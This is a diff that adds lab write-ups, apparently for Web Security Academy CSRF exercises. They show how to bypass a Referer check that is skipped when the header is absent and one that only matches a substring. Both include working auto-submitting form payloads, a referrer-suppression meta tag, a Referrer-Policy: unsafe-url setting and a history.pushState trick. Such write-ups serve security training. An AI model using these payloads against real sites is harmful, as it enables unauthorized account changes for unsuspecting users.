@@ -264,3 +264,84 @@ Payload for victim:
     }
 </script>
 ```
+
+## CSRF where Referer validation depends on header being present
+
+Changing email request does not require any random secret, so its vulnerable to CSRF.
+
+Changing the `Referer` results in `Invalid referer header` error. But removing it completely bypasses the check and results in success.
+
+Payload for victim:
+```
+<html>
+    <!-- Do not send Referer header with this request -->
+    <meta name="referrer" content="never">
+
+	<body>
+		<form method="POST" action="https://0ad5001d035e318b80cf12dc00200057.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@email.com"/>
+		</form>
+
+        <script>
+            document.forms[0].submit()
+        </script>
+	</body>
+<html>
+```
+
+## CSRF with broken Referer validation
+
+Same scenario as above, but this this error is returned when no `Referer` header is present.
+
+`Referer` header check is naive and check only if `0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net` is present.
+Values like `XXXX0ace00b303c63a7c80b82b3600aa005d.web-security-academy.netXXXX` are accepted.
+
+Configure our exploit server to responde with header:
+
+```
+Referrer-Policy: unsafe-url
+``` 
+
+and craft link to our exploit to include required `Referer` value. Something like:
+
+```
+https://exploit-0afa002b03ea3a4980d22a3b018d009b.exploit-server.net/exploit?q=0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net
+```
+
+With this preparation the request sent from our site accesed from the link above will container required `Referer` header part and will be able to perform CSRF changing email.
+
+Payload for victim:
+```
+<html>
+	<body>
+		<form method="POST" action="https://0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@email.com"/>
+		</form>
+        <script>
+            document.forms[0].submit()
+        </script>
+	</body>
+<html>
+```
+
+For local tests this approached worked fine. But not for the victim for some reason.
+
+Updated payload:
+
+```
+<html>
+	<body>
+		<form method="POST" action="https://0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@email.com"/>
+		</form>
+        <script>
+            history.pushState("", "", "/?0ace00b303c63a7c80b82b3600aa005d.web-security-academy.net")
+            document.forms[0].submit()
+        </script>
+	</body>
+<html>
+```
+
+Now access link to payload does not contain `q` param with required `Referer` part. `Referrer-Policy` was preserved.
+
+Now this exploit works locally and for the victim.
